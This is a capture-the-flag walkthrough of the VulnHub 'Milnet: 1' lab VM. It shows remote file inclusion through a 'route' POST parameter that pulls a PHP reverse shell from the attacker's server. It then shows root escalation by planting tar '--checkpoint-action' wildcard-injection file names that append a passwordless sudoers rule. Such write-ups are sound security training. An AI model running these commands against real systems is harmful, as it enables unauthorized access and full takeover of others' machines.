## Milnet: 1

### info

```
Welcome to 1989!

And welcome to Germany!

This VM is inspired by a book! There should be plenty of hints which one it is, if you havent read it.

This is a simple VM, so dont fear any advanced exploitation, reverse engineering or other advanced techniques!

Just a solid and simple advanced persistent threat (admins) ;)

So the level is clearly: beginner (as intended).

For some it may teach a solid (old) new Privesc technique that together with the above mentioned book inspired me to this VM.

I made the effort to throw some very basic story/polish into it.

Also if everythin runs smoothly the VM should show its IP adress in the Login screen on the console!

-No, I dont consider finding the VM in your own network a real challenge ;)-

If you should encounter any problems or want to drop me a line use #milet and @teh_warriar on twitter or chat me up in #vulnhub!

Hope you enjoy this VM!

Gonna enjoy reading some writeups and hope you might find other ways then the intended ones!

Best Regards

Warrior

To convert the VM so it works with Virtualbox: qemu-img convert -disk1.vmdk -disk1.bin; VBoxManage convertfromraw -disk1.bin -disk1.vdi --format VDI

https://www.vulnhub.com/entry/milnet-1,148/
```

### discovery

```bash
root@kali:~# netdiscover -r 192.168.93.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.93.1    00:50:56:c0:00:08      1      60  VMware, Inc.
 192.168.93.2    00:50:56:fe:26:a7      1      60  VMware, Inc.
 192.168.93.140  00:0c:29:33:4f:8b      1      60  VMware, Inc.
 192.168.93.254  00:50:56:e3:39:c3      1      60  VMware, Inc.

```

### port scan

```bash
root@kali:~# nmap -p-  -sV  192.168.93.140

Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-24 17:37 BST
Nmap scan report for 192.168.93.140
Host is up (0.00047s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    lighttpd 1.4.35
MAC Address: 00:0C:29:33:4F:8B (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.69 seconds
```

### port 80

```bash
root@kali:~# curl 192.168.93.140
<html>
<head>
</head>
<frameset cols="200, *">
<frame src="nav.php" name="navigation">
<frame src="main.php" name="content">
</frameset>
</html>
```

```bash
root@kali:~# gobuster -w /usr/share/seclists/Discovery/Web_Content/common.txt -u http://192.168.93.140 -e

Gobuster v1.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.93.140/
[+] Threads      : 10
[+] Wordlist     : /usr/share/seclists/Discovery/Web_Content/common.txt
[+] Status codes : 200,204,301,302,307
[+] Expanded     : true
=====================================================
http://192.168.93.140/index.php (Status: 200)
http://192.168.93.140/info.php (Status: 200)
=====================================================
```

```bash
root@kali:~# curl http://192.168.93.140/info.php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<style type="text/css">
body {background-color: #fff; color: #222; font-family: sans-serif;}
pre {margin: 0; font-family: monospace;}
a:link {color: #009; text-decoration: none; background-color: #fff;}
a:hover {text-decoration: underline;}
table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}
.center {text-align: center;}
.center table {margin: 1em auto; text-align: left;}
.center th {text-align: center !important;}
td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}
h1 {font-size: 150%;}
h2 {font-size: 125%;}
.p {text-align: left;}
.e {background-color: #ccf; width: 300px; font-weight: bold;}
.h {background-color: #99c; font-weight: bold;}
.v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}
.v i {color: #999;}
img {float: right; border: 0;}
hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
</style>
<title>phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /></head>
<body><div class="center">
<table>

---snip---
```

```bash
root@kali:~# nikto -h http://192.168.93.140/ -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.93.140
+ Target Hostname:    192.168.93.140
+ Target Port:        80
+ Start Time:         2016-07-24 18:18:00 (GMT1)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.35
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
+ /info.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ /info.php?file=http://cirt.net/rfiinc.txt?: Output from the phpinfo() function was found.
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ 26165 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2016-07-24 18:18:44 (GMT1) (44 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

hmm not a lot but some RFI i cant seem to get to work

using burp we see the php parameter used at index.php

```html
POST /content.php HTTP/1.1
Host: 192.168.93.140
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.93.140/nav.php
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

route=props
```

however nikto got me again

`curl http://192.168.93.140/index.php?route=http://192.168.93.128:8080/`

did not work, so its back to burb suite


using burp's spider i found `/content.php`

```bash
root@kali:~# curl http://192.168.93.140/content.php
<br><br>
<div align="center">
<img height=80%% src=mj.jpg>
<h1>Army Material Command Seckenheim, Deutschland

root@kali:~# curl http://192.168.93.140/
<html>
<head>
</head>
<frameset cols="200, *">
<frame src="nav.php" name="navigation">
<frame src="main.php" name="content">
</frameset>
</html>

```

the same php parameter is used on the `content.php` page too

```html
POST /content.php HTTP/1.1
Host: 192.168.93.140
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://192.168.93.140/nav.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

route=main
```

so i tired `curl http://192.168.93.140/content.php?route=http://192.168.93.128:8080/` but i was getting nowhere with it, i then used the repeater in burp suite, and changing the parameter to point to my http server worked. So i've missed something or done something wrong, luckily burp suite will allow you to copy as a curl command. Once i done that i could clearly see what i was doing wrong.

`curl -X 'POST' --data-binary $'route=http://192.168.93.128/' 'http://192.168.93.140/content.php'`
is the stripped down command from burp and we sure do get GET requests on our server

```python
root@kali:~# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
192.168.93.140 - - [24/Jul/2016 18:38:50] code 404, message File not found
192.168.93.140 - - [24/Jul/2016 18:38:50] "GET /.php HTTP/1.0" 404 -
```

now thats out of the way, i know that nikto was telling the truth (sorry for doubting you nikto).  

### shell

```bash
root@kali:~# cp /usr/share/webshells/php/php-reverse-shell.php .
root@kali:~# vim php-reverse-shell.php
root@kali:~# python -m SimpleHTTPServer 80
```

```bash
root@kali:~# ncat -nlvp 443
Ncat: Version 7.12 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
```

```bash
curl -X 'POST' --data-binary $'route=http://192.168.93.128/php-reverse-shell.php' 'http://192.168.93.140/content.php'
```

and nothing back.... looking at the HTTP server logs we can see the issue

`192.168.93.140 - - [24/Jul/2016 18:57:37] "GET /php-reverse-shell.php.php HTTP/1.0" 404 -`

so the request is adding `.php` to the end of the file name, this should be a simple fix

```bash
root@kali:~# cp php-reverse-shell.php php-reverse-shell
```

```bash
root@kali:~# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
192.168.93.140 - - [24/Jul/2016 19:00:38] "GET /php-reverse-shell.php HTTP/1.0" 200 -
```

`root@kali:~# curl -X 'POST' --data-binary $'route=http://192.168.93.128/php-reverse-shell' 'http://192.168.93.140/content.php'`

```bash
root@kali:~# ncat -nlvp 443
Ncat: Version 7.12 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 192.168.93.140.
Ncat: Connection from 192.168.93.140:43248.
Linux seckenheim.net.mil 4.4.0-22-generic #40-Ubuntu SMP Thu May 12 22:03:46 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 13:41:49 up  1:24,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

bingo we have a shell

```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
/bin/sh: 2: python: not found
```
oh i see.

```bash
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2016-07-25 13:52:38--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.60.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.60.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 40155 (39K) [text/plain]
Saving to: 'LinEnum.sh'

     0K .......... .......... .......... .........            100% 1.14M=0.03s

2016-07-25 13:52:39 (1.14 MB/s) - 'LinEnum.sh' saved [40155/40155]

```

interesting information from the output of that script

```bash
Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 * 	* * * 	root	/backup/backup.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

```bash
World-readable files within /home:
-rw-r--r-- 1 langman langman 220 May 21 15:45 /home/langman/.bash_logout
-rw-rw-r-- 1 langman langman 21837 Jun 26  2014 /home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt
-rw-rw-r-- 1 langman langman 108282 Sep 30  1991 /home/langman/SDINET/fips_500_166.txt
-rw-rw-r-- 1 langman langman 19858 May 21 22:15 /home/langman/SDINET/sec-9720.txt
-rw-rw-r-- 1 langman langman 74745 Feb  3  1992 /home/langman/SDINET/DCA_Circular.310-P115-1
-rw-rw-r-- 1 langman langman 46170 Sep 21  2009 /home/langman/SDINET/FUN18.TXT
-rw-rw-r-- 1 langman langman 25048 Sep 30  1991 /home/langman/SDINET/fips_500_170.txt
-rw-rw-r-- 1 langman langman 16044 Sep 30  1991 /home/langman/SDINET/fips_500_171.txt
-rw-rw-r-- 1 langman langman 6337 Jun 15  2001 /home/langman/SDINET/compserv.txt
-rw-rw-r-- 1 langman langman 2894 Jul 10  1991 /home/langman/SDINET/sec-8901.txt
-rw-rw-r-- 1 langman langman 766 May 24  1994 /home/langman/SDINET/fips-index.
-rw-rw-r-- 1 langman langman 23135 Sep 30  1991 /home/langman/SDINET/fips_500_169.txt
-rw-rw-r-- 1 langman langman 3451 Jul 10  1991 /home/langman/SDINET/sec-8902.txt
-rw-rw-r-- 1 langman langman 13214 May 21 22:19 /home/langman/SDINET/sec-9540.txt
-rw-rw-r-- 1 langman langman 7534 Sep 30  1999 /home/langman/SDINET/pentagon.txt
-rw-r--r-- 1 langman langman 675 May 21 15:45 /home/langman/.profile
-rw-r--r-- 1 langman langman 3771 May 21 15:45 /home/langman/.bashrc
```

there is a .txt file to [this](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)

```bash
$ cat /backup/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /backup/backup.tgz *
$ cd /backup
$ ls -al
total 124
drwxr-xr-x  2 root root   4096 May 21 22:30 .
drwxr-xr-x 24 root root   4096 May 21 20:14 ..
-rw-r--r-x  1 root root     57 May 21 22:28 backup.sh
-rw-r--r--  1 root root 112640 Jul 25 14:21 backup.tgz
```

### escalation

so from that site it looks like i have to do something like this, as the cron task runs as root

```bash
$ touch ./--checkpoint=1
$ touch "./--checkpoint-action=exec=sh shell.sh"
$ echo "/usr/bin/id" >> shell.sh
$ ls -al
total 132
-rw-rw-rw- 1 www-data www-data     0 Jul 25 14:39 --checkpoint-action=exec=sh shell.sh
-rw-rw-rw- 1 www-data www-data     0 Jul 25 14:39 --checkpoint=1
drwxr-xr-x 2 www-data www-data  4096 Jul 25 14:39 .
drwxr-xr-x 3 root     root      4096 May 21 15:50 ..
-rw-r--r-- 1 root     root     73450 Aug  6  2015 bomb.jpg
-rw-r--r-- 1 root     root      3901 May 21 18:56 bomb.php
-rw-r--r-- 1 root     root       124 May 21 17:50 content.php
-rw-r--r-- 1 root     root       145 May 21 17:17 index.php
-rw-r--r-- 1 www-data www-data    20 May 21 15:54 info.php
-rw-r--r-- 1 root     root       109 May 21 18:53 main.php
-rw-r--r-- 1 root     root     18260 Jan 22  2012 mj.jpg
-rw-r--r-- 1 root     root       532 May 21 23:33 nav.php
-rw-r--r-- 1 root     root       253 May 22 21:07 props.php
-rw-rw-rw- 1 www-data www-data    12 Jul 25 14:39 shell.sh
```

but numnuts here did not read the article properly, i'll never see the output from `/usr/bin/id` so i added the following to `shell.sh`

```bash
$ cat ./shell.sh

echo "www-data  ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```


```bash
$ /bin/bash -i
bash: cannot set terminal process group (1177): Inappropriate ioctl for device
bash: no job control in this shell
www-data@seckenheim:/var/www/html$
```

```bash
www-data@seckenheim:/var/www/html$ sudo su
sudo su

id
uid=0(root) gid=0(root) groups=0(root)
```

### flag

```
/bin/bash -i
bash: cannot set terminal process group (1177): Inappropriate ioctl for device
bash: no job control in this shell
root@seckenheim:/var/www/html#

root@seckenheim:/var/www/html# cd
cd
root@seckenheim:~# ls -al
ls -al
total 44
drwx------  3 root root 4096 May 22 21:07 .
drwxr-xr-x 24 root root 4096 May 21 20:14 ..
-rw-------  1 root root    6 May 22 21:09 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 May 21 19:07 .cache
-rw-r--r--  1 root root 1727 May 21 22:42 credits.txt
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   75 May 21 18:58 .selected_editor
-rw-------  1 root root 9964 May 22 21:07 .viminfo
root@seckenheim:~# cat ./credits.txt
cat ./credits.txt
        ,----,
      ,/   .`|
    ,`   .'  :  ,---,                          ,---,.
  ;    ;     /,--.' |                        ,'  .' |                  ,---,
.'___,/    ,' |  |  :                      ,---.'   |      ,---,     ,---.'|
|    :     |  :  :  :                      |   |   .'  ,-+-. /  |    |   | :
;    |.';  ;  :  |  |,--.   ,---.          :   :  |-, ,--.'|'   |    |   | |
`----'  |  |  |  :  '   |  /     \         :   |  ;/||   |  ,"' |  ,--.__| |
    '   :  ;  |  |   /' : /    /  |        |   :   .'|   | /  | | /   ,'   |
    |   |  '  '  :  | | |.    ' / |        |   |  |-,|   | |  | |.   '  /  |
    '   :  |  |  |  ' | :'   ;   /|        '   :  ;/||   | |  |/ '   ; |:  |
    ;   |.'   |  :  :_:,''   |  / |        |   |    \|   | |--'  |   | '/  '
    '---'     |  | ,'    |   :    |        |   :   .'|   |/      |   :    :|
              `--''       \   \  /         |   | ,'  '---'        \   \  /
                           `----'          `----'                  `----'


This was milnet for #vulnhub by @teh_warriar
I hope you enjoyed this vm!

If you liked it drop me a line on twitter or in #vulnhub.

I hope you found the clue:
/home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt
I was sitting on the idea for using this technique for a BOOT2ROOT VM prives for a long time...

This VM was inspired by The Cuckoo's Egg.
If you have not read it give it a try:
http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/
```
